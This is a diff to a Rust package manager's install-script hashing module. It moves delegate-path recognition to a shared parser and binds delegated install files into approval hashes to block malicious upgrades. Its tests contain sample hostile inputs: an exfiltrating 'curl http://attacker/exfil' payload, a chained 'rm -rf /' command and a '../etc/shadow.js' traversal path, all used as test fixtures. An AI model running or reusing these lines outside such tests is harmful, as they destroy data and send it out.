@@ -21,13 +21,17 @@
 //! 2. A NUL separator (`\x00`)
 //! 3. The script body as bytes if present, OR the empty byte sequence if absent
 //! 4. **If the phase body delegates to an in-package file** (the
-//!    `node <reserved>.js` shape — `install.js`, `postinstall.js`,
-//!    `preinstall.js`, plus the `.cjs`/`.mjs` variants) — a unit
-//!    separator (`\x1f` — ASCII US), the delegate path as bytes, a NUL
-//!    separator, and the SHA-256 of the delegated file's bytes. The
-//!    delegate file is read from the same `store_pkg_dir` the
+//!    `node <safe-relative-path>.{js,cjs,mjs}` shape that
+//!    [`crate::static_gate::extract_delegate_path`] recognizes) — a
+//!    unit separator (`\x1f` — ASCII US), the delegate path as bytes,
+//!    a NUL separator, and the SHA-256 of the delegated file's bytes.
+//!    The delegate file is read from the same `store_pkg_dir` the
 //!    `package.json` came from, so the hash binds the executed code
-//!    AND the entry point in lockstep.
+//!    AND the entry point in lockstep. Without this step, two
+//!    versions of a package with byte-identical scripts maps but
+//!    different `install.js` bytes would produce the same hash, and
+//!    a content-blind `StrictBinding` would silently re-use the prior
+//!    approval across a malicious upgrade.
 //! 5. A record separator (`\x1e` — ASCII RS) between phases
 //!
 //! Empty phases are explicitly hashed as the empty string so removing a
@@ -36,16 +40,18 @@
 //! present scripts only" — it forecloses an attack where a maintainer
 //! moves a payload between phases to keep the hash stable.
 //!
-//! ## H17 — delegate body binding
+//! ## Delegate recognition — shared parser
 //!
-//! Step 4 above (the `\x1f` delegate annotation) closes H17: a malicious
-//! v1.0.1 that ships the SAME `postinstall: "node install.js"` shape as
-//! v1.0.0 but with different `install.js` bytes now produces a
-//! different `script_hash`. `StrictBinding` therefore fires `BindingDrift`
-//! instead of silently re-using v1.0.0's approval. Without the delegate
-//! body in the hash, only the literal string `"node install.js"` was
-//! covered and the user's approval was content-blind to the file the
-//! script actually executed.
+//! Step 4 dispatches through [`crate::static_gate::extract_delegate_path`]
+//! — the single source of truth shared with
+//! `lpm_cli::build_state::parse_delegated_paths` and with the static
+//! gate's own `matches_node_relative` / `matches_delegating_identity_green`
+//! routes. Every script body the static gate classifies as Green via a
+//! `node <path>` shape is also detected here. Keeping these three call
+//! sites on one parser closes the gap where a slightly looser shape
+//! (e.g. `node ./install.js`, the leading-`.` variant the static gate
+//! accepts) would be greenlit for trust without the corresponding
+//! delegate-file binding in the hash.
 //!
 //! ## Source of truth
 //!
@@ -59,6 +65,7 @@ use sha2::{Digest, Sha256};
 use std::path::Path;
 
 use crate::EXECUTED_INSTALL_PHASES;
+use crate::static_gate::extract_delegate_path;
 
 /// Record separator between phases in the hash input.
 /// ASCII RS (Record Separator) — distinct from any byte that can appear
@@ -71,116 +78,11 @@ const RECORD_SEP: u8 = 0x1e;
 const FIELD_SEP: u8 = 0x00;
 
 /// Unit separator that prefixes a delegate-file annotation appended
-/// after a phase body when the body matches the `node <reserved>.js`
-/// delegate shape. Distinct from `RECORD_SEP` so the annotation can be
-/// distinguished from the start of the next phase.
+/// after a phase body when the body matches a `node <path>` delegate
+/// shape (see [`crate::static_gate::extract_delegate_path`]). Distinct
+/// from `RECORD_SEP` so the annotation can be distinguished from the
+/// start of the next phase.
 const DELEGATE_SEP: u8 = 0x1f;
-
-/// Reserved lifecycle basenames that a phase body may delegate to.
-/// Mirror of `crate::static_gate::is_reserved_lifecycle_basename` — kept
-/// in sync intentionally so the script-hash extension recognizes exactly
-/// the same set of "in-package executed bytes" the static gate already
-/// treats as a delegate.
-const DELEGATE_BASENAMES: &[&str] = &[
-    "install.js",
-    "install.cjs",
-    "install.mjs",
-    "postinstall.js",
-    "postinstall.cjs",
-    "postinstall.mjs",
-    "preinstall.js",
-    "preinstall.cjs",
-    "preinstall.mjs",
-];
-
-/// If the phase body delegates to an in-package file via the
-/// `node <reserved>.js` shape, return the relative path. Otherwise
-/// return `None` (the phase body does not delegate; only its literal
-/// bytes participate in the hash).
-///
-/// Recognition contract (must stay aligned with
-/// `crate::static_gate::matches_delegating_identity_green`):
-///
-/// 1. The body must tokenize via shell-quoting rules into exactly two
-///    tokens (the second-arg invocation shape).
-/// 2. The first token must be `node` (case-sensitive — matches the
-///    static gate's allowlist).
-/// 3. The second token must be a safe relative path (no leading `/`,
-///    no leading `..`, no embedded `..` segment, no `~`/`$`/null bytes).
-/// 4. The path must end in `.js` / `.cjs` / `.mjs`.
-/// 5. The basename must be one of [`DELEGATE_BASENAMES`].
-///
-/// Mismatch on any rule returns `None` — the body is treated as a
-/// generic command line whose only contribution to the hash is its
-/// own bytes. The delegate annotation only fires for the shape the
-/// static gate already treats as "in-package executed code."
-fn extract_delegate_path(body: &str) -> Option<&str> {
-    let trimmed = body.trim();
-    if trimmed.is_empty() {
-        return None;
-    }
-    // Cheap pre-filter — every recognized shape starts with the `node `
-    // prefix. Anything else cannot match.
-    if !trimmed.starts_with("node ") {
-        return None;
-    }
-    let rest = trimmed[5..].trim_start();
-    if rest.is_empty() || rest.contains(char::is_whitespace) {
-        return None;
-    }
-    // Reject anything that contains shell metacharacters or quoting —
-    // the recognized shape is a single bare path token, never a quoted
-    // path or one with embedded operators. Falling through to None on
-    // suspicious chars keeps the recognizer strict.
-    if rest.bytes().any(|b| {
-        matches!(
-            b,
-            b'"' | b'\''
-                | b'`'
-                | b'$'
-                | b'\\'
-                | b'|'
-                | b'&'
-                | b';'
-                | b'>'
-                | b'<'
-                | b'('
-                | b')'
-                | b'{'
-                | b'}'
-                | b'\0'
-        )
-    }) {
-        return None;
-    }
-    if !is_safe_relative_path(rest) {
-        return None;
-    }
-    if !(rest.ends_with(".js") || rest.ends_with(".cjs") || rest.ends_with(".mjs")) {
-        return None;
-    }
-    let basename = rest.rsplit('/').next().unwrap_or(rest);
-    if !DELEGATE_BASENAMES.contains(&basename) {
-        return None;
-    }
-    Some(rest)
-}
-
-/// Strict safe-relative-path check. Matches the static gate's
-/// `is_safe_relative_path` contract: rejects absolute paths, `..`
-/// segments, home-relative (`~`), and any path that escapes the
-/// package root.
-fn is_safe_relative_path(path: &str) -> bool {
-    if path.is_empty() || path.starts_with('/') || path.starts_with('~') {
-        return false;
-    }
-    for segment in path.split('/') {
-        if segment.is_empty() || segment == ".." || segment == "." {
-            return false;
-        }
-    }
-    true
-}
 
 /// Compute the deterministic install-script hash for a package located at
 /// the given store directory.
@@ -230,21 +132,15 @@ pub fn compute_script_hash(store_pkg_dir: &Path) -> Option<String> {
         let body = scripts.get(*phase).and_then(|v| v.as_str()).unwrap_or("");
         hasher.update(body.as_bytes());
 
-        // Delegate-body extension. When the body matches the
-        // `node <reserved>.js` shape, hash the in-package file's
-        // bytes too. Closes H17: a malicious v1.0.1 that ships the
-        // same delegate-shape postinstall as v1.0.0 but with different
-        // install.js bytes now produces a different `script_hash`,
-        // surfacing the upgrade as `BindingDrift` instead of silently
-        // re-using the prior approval.
-        //
-        // The annotation embeds (a) the delegate path the user
-        // would see in their package, plus (b) the SHA-256 of the
-        // delegated file's actual bytes. Path + content-digest
-        // together so a malicious upgrade can't rename `install.js`
-        // → `install2.js` to keep the same content-digest while
-        // changing entry points (rename → different annotation →
-        // different hash).
+        // Delegate-body extension. When the body matches a
+        // `node <path>` delegate shape, hash the in-package file's
+        // bytes too. The annotation embeds (a) the relative path
+        // exactly as it appears in the script body, plus (b) the
+        // SHA-256 of the delegated file's actual bytes. Path +
+        // content-digest together so a malicious upgrade can't
+        // rename `install.js` → `install2.js` to keep the same
+        // content-digest while changing entry points (rename →
+        // different annotation → different hash).
         //
         // Read errors (file missing, IO failure) hash an explicit
         // sentinel rather than skipping silently. A package that
@@ -256,7 +152,7 @@ pub fn compute_script_hash(store_pkg_dir: &Path) -> Option<String> {
             hasher.update([DELEGATE_SEP]);
             hasher.update(rel_path.as_bytes());
             hasher.update([FIELD_SEP]);
-            let delegate_path = store_pkg_dir.join(rel_path);
+            let delegate_path = store_pkg_dir.join(&rel_path);
             match std::fs::read(&delegate_path) {
                 Ok(bytes) => {
                     let mut inner = Sha256::new();
@@ -389,7 +285,7 @@ mod tests {
         //   "postinstall" \x00
         //
         // (preinstall and postinstall bodies are empty; install body is
-        // a delegate-shape that triggers the H17 binding to install.js.)
+        // a delegate-shape that triggers the binding to install.js.)
         //
         // The literal below is computed by running this test once with a
         // placeholder, copying the actual output, and locking it. To
@@ -415,7 +311,7 @@ mod tests {
     }
 
     /// Locked fixture hash for [`compute_script_hash_same_input_same_output_across_machines`].
-    /// Includes the H17 delegate-binding annotation for install.js.
+    /// Includes the delegate-binding annotation for install.js.
     const EXPECTED_FIXTURE_HASH: &str =
         "sha256-dfa4f083e8c58a8ef7cd4d27d976fdd7740ee519abe0cdd589d7c1245ad9fe01";
 
@@ -515,17 +411,20 @@ mod tests {
     }
 
     // ─────────────────────────────────────────────────────────────────
-    // H17 — delegate-body binding regressions
+    // Delegate-body binding — every `node <path>` shape the static gate
+    // greenlights must bind the in-package file bytes into the hash.
+    // Without this, an upgrade that swaps the delegated file while
+    // keeping the script body string identical would silently re-use
+    // the prior approval (the integrity slot would differ, but the
+    // script_hash would not, so a re-approval review wouldn't even
+    // be able to compare body bytes).
     // ─────────────────────────────────────────────────────────────────
 
-    /// **H17 regression:** two packages with IDENTICAL `postinstall:
-    /// "node install.js"` strings but DIFFERENT `install.js` bytes
-    /// MUST produce different `script_hash` values. Without this, a
-    /// malicious v1.0.1 that swaps install.js but keeps the postinstall
-    /// shape inherits v1.0.0's approval token via `StrictBinding` (the
-    /// hash matches identically).
+    /// Two packages with IDENTICAL `postinstall: "node install.js"`
+    /// strings but DIFFERENT `install.js` bytes MUST produce different
+    /// `script_hash` values.
     #[test]
-    fn compute_script_hash_h17_delegate_body_change_changes_hash() {
+    fn compute_script_hash_changes_when_delegate_file_body_changes() {
         let dir1 = tempdir().unwrap();
         let dir2 = tempdir().unwrap();
         write_pkg_json(
@@ -536,9 +435,7 @@ mod tests {
             dir2.path(),
             &serde_json::json!({"postinstall": "node install.js"}),
         );
-        // v1.0.0 ships a benign install.js
         fs::write(dir1.path().join("install.js"), b"console.log('hi')\n").unwrap();
-        // v1.0.1 ships a malicious install.js with the SAME postinstall
         fs::write(
             dir2.path().join("install.js"),
             b"require('child_process').execSync('curl http://attacker/exfil')\n",
@@ -546,21 +443,60 @@ mod tests {
         .unwrap();
         let h1 = compute_script_hash(dir1.path()).unwrap();
         let h2 = compute_script_hash(dir2.path()).unwrap();
-        assert_ne!(
-            h1, h2,
-            "H17: install.js bytes must enter the hash via the delegate \
-             annotation — a same-shape upgrade with different install.js \
-             content must surface as BindingDrift, not silent re-trust"
-        );
+        assert_ne!(h1, h2);
     }
 
-    /// **H17 — delegate-rename surface:** renaming the delegate target
-    /// (e.g., `install.js` → `install.cjs`) MUST change the hash too,
-    /// because the path is part of the annotation. Otherwise a malicious
-    /// maintainer could ship the same body bytes under a different
-    /// entry-point name to dodge BindingDrift detection.
+    /// Every spelling the static gate greenlights via
+    /// [`crate::static_gate::matches_delegating_identity_green`] or
+    /// [`crate::static_gate::matches_node_relative`] must produce a
+    /// distinct hash when the delegate file body changes. Coverage
+    /// gap regression: the previous narrow recognizer rejected
+    /// `node ./install.js` outright, so a package using that spelling
+    /// still passed the strict gate without delegate-body binding.
     #[test]
-    fn compute_script_hash_h17_delegate_path_rename_changes_hash() {
+    fn compute_script_hash_binds_delegate_for_every_greenlit_node_path_spelling() {
+        let spellings = [
+            ("install.js", "node install.js"),
+            ("install.js", "node ./install.js"),
+            ("install.js", "node ./install.js"),
+            ("install.cjs", "node install.cjs"),
+            ("install.mjs", "node install.mjs"),
+            ("postinstall.js", "node postinstall.js"),
+            ("preinstall.js", "node preinstall.js"),
+            // Non-reserved basenames are also delegate shapes —
+            // matches_node_relative classifies these as Green
+            // unconditionally (no identity-match needed). They must
+            // also bind the delegated file.
+            ("my-build.js", "node my-build.js"),
+            ("scripts/install.js", "node scripts/install.js"),
+        ];
+        for (file, body) in spellings {
+            let dir1 = tempdir().unwrap();
+            let dir2 = tempdir().unwrap();
+            write_pkg_json(dir1.path(), &serde_json::json!({"postinstall": body}));
+            write_pkg_json(dir2.path(), &serde_json::json!({"postinstall": body}));
+            if let Some(parent) = std::path::Path::new(file).parent()
+                && !parent.as_os_str().is_empty()
+            {
+                fs::create_dir_all(dir1.path().join(parent)).unwrap();
+                fs::create_dir_all(dir2.path().join(parent)).unwrap();
+            }
+            fs::write(dir1.path().join(file), b"benign\n").unwrap();
+            fs::write(dir2.path().join(file), b"malicious\n").unwrap();
+            let h1 = compute_script_hash(dir1.path()).unwrap();
+            let h2 = compute_script_hash(dir2.path()).unwrap();
+            assert_ne!(h1, h2, "spelling {body:?} must bind {file:?} into the hash");
+        }
+    }
+
+    /// Renaming the delegate target (e.g., `install.js` →
+    /// `install.cjs`) MUST change the hash even when the file bytes
+    /// are byte-identical, because the path is part of the
+    /// annotation. Otherwise a malicious maintainer could ship the
+    /// same body under a different entry-point name to dodge
+    /// `BindingDrift` detection.
+    #[test]
+    fn compute_script_hash_changes_when_delegate_file_path_changes() {
         let dir1 = tempdir().unwrap();
         let dir2 = tempdir().unwrap();
         write_pkg_json(
@@ -571,7 +507,6 @@ mod tests {
             dir2.path(),
             &serde_json::json!({"postinstall": "node install.cjs"}),
         );
-        // Same bytes; different basename → different annotation → different hash.
         fs::write(dir1.path().join("install.js"), b"console.log('hi')\n").unwrap();
         fs::write(dir2.path().join("install.cjs"), b"console.log('hi')\n").unwrap();
         let h1 = compute_script_hash(dir1.path()).unwrap();
@@ -579,54 +514,37 @@ mod tests {
         assert_ne!(h1, h2);
     }
 
-    /// **H17 — non-delegate body unaffected:** a script body that does
-    /// NOT match the delegate-shape allowlist (e.g., `node-gyp rebuild`,
-    /// `tsc`, `husky install`) MUST NOT trigger delegate-body reads.
-    /// The hash is exactly the pre-extension hash for these shapes so
-    /// existing approvals on tier-Green inline commands keep working
-    /// after this fix lands.
+    /// A script body that does NOT match the delegate shape (e.g.,
+    /// `node-gyp rebuild`, `tsc`, `husky install`) MUST NOT trigger
+    /// delegate-body reads. Existing approvals on tier-Green inline
+    /// commands keep working unchanged — unrelated files in the
+    /// package don't leak into the hash and create false drift.
     #[test]
-    fn compute_script_hash_h17_does_not_alter_non_delegate_shapes() {
+    fn compute_script_hash_unaffected_by_unrelated_files_when_body_is_not_delegate_shape() {
         let dir = tempdir().unwrap();
         write_pkg_json(
             dir.path(),
             &serde_json::json!({"install": "node-gyp rebuild"}),
         );
-        // Hash without any node-gyp executable present (we're hashing
-        // the package.json scripts, not invoking them).
         let h = compute_script_hash(dir.path()).unwrap();
-        // The pre-extension format hashes only the body bytes:
-        // "preinstall" \x00 \x1e "install" \x00 "node-gyp rebuild" \x1e "postinstall" \x00
-        // We're not pinning the literal hash (a separate fixture test
-        // does that) — just asserting that the hash is determined ONLY
-        // by the script body when no delegate annotation fires.
         let dir2 = tempdir().unwrap();
         write_pkg_json(
             dir2.path(),
             &serde_json::json!({"install": "node-gyp rebuild"}),
         );
-        // Add an unrelated install.js — it must NOT enter the hash
-        // because the body isn't `node install.js`.
         fs::write(
             dir2.path().join("install.js"),
             b"// completely unrelated content\n",
         )
         .unwrap();
         let h2 = compute_script_hash(dir2.path()).unwrap();
-        assert_eq!(
-            h, h2,
-            "non-delegate bodies must NOT trigger delegate-body reads; \
-             unrelated install.js bytes leaking into the hash would \
-             create false drift on legitimate packages"
-        );
+        assert_eq!(h, h2);
     }
 
-    /// **H17 — delegate-shape with missing file** falls back to a
-    /// stable `<delegate-unreadable>` sentinel rather than crashing or
-    /// skipping. Determinism guarantee: the same missing-file scenario
-    /// hashes the same way across runs.
+    /// A delegate-shape script body whose target file is missing
+    /// hashes a stable sentinel rather than crashing or skipping.
     #[test]
-    fn compute_script_hash_h17_delegate_missing_file_is_deterministic() {
+    fn compute_script_hash_deterministic_when_delegated_file_is_missing() {
         let dir1 = tempdir().unwrap();
         let dir2 = tempdir().unwrap();
         write_pkg_json(
@@ -637,39 +555,51 @@ mod tests {
             dir2.path(),
             &serde_json::json!({"postinstall": "node install.js"}),
         );
-        // Neither dir has install.js — both should sentinel-hash identically.
         let h1 = compute_script_hash(dir1.path()).unwrap();
         let h2 = compute_script_hash(dir2.path()).unwrap();
         assert_eq!(h1, h2);
     }
 
-    /// **H17 — delegate path traversal refused:** the recognizer must
-    /// reject `node ../etc/shadow.js` and similar escape attempts so a
-    /// malicious package can't hash external files (which would be a
-    /// gratuitous IO side-effect, not a security bypass per se, but
-    /// still a recognition contract regression).
+    /// The shared recognizer in
+    /// [`crate::static_gate::extract_delegate_path`] must reject
+    /// `node ../etc/shadow.js` and similar escape attempts so a
+    /// malicious package can't drive disk reads outside the package
+    /// directory via the delegate-binding code path.
     #[test]
-    fn compute_script_hash_h17_delegate_recognizer_rejects_path_traversal() {
-        assert_eq!(extract_delegate_path("node install.js"), Some("install.js"));
-        assert_eq!(extract_delegate_path("node ./install.js"), None);
+    fn delegate_recognizer_rejects_path_traversal_and_shell_metas() {
+        use crate::static_gate::extract_delegate_path;
+        assert_eq!(
+            extract_delegate_path("node install.js"),
+            Some("install.js".to_string())
+        );
+        assert_eq!(
+            extract_delegate_path("node ./install.js"),
+            Some("./install.js".to_string())
+        );
         assert_eq!(extract_delegate_path("node ../install.js"), None);
         assert_eq!(extract_delegate_path("node /etc/install.js"), None);
         assert_eq!(extract_delegate_path("node ~/install.js"), None);
-        assert_eq!(extract_delegate_path("node \"install.js\""), None);
+        // shlex strips quoting, so `node "install.js"` and the bare
+        // form are equivalent — both recognised.
+        assert_eq!(
+            extract_delegate_path("node \"install.js\""),
+            Some("install.js".to_string())
+        );
         assert_eq!(extract_delegate_path("node install.js && rm -rf /"), None);
         assert_eq!(extract_delegate_path("node install.sh"), None);
         assert_eq!(extract_delegate_path("node install"), None);
-        // Reserved-basename allowlist is the gate — a non-reserved
-        // basename does NOT trigger the delegate annotation. The
-        // non-reserved `node <relative>.js` shape is handled by the
-        // static gate's `matches_node_relative` path (already amber-
-        // gated) and does not need delegate-body binding.
-        assert_eq!(extract_delegate_path("node my-build.js"), None);
+        // Non-reserved basenames ARE delegate shapes too — the static
+        // gate's matches_node_relative greenlights them unconditionally,
+        // so the hash must bind them to prevent the same upgrade attack.
+        assert_eq!(
+            extract_delegate_path("node my-build.js"),
+            Some("my-build.js".to_string())
+        );
         // Reserved basenames in nested paths are accepted (the static
         // gate also accepts these via the safe-relative check).
         assert_eq!(
             extract_delegate_path("node scripts/install.js"),
-            Some("scripts/install.js")
+            Some("scripts/install.js".to_string())
         );
     }
 
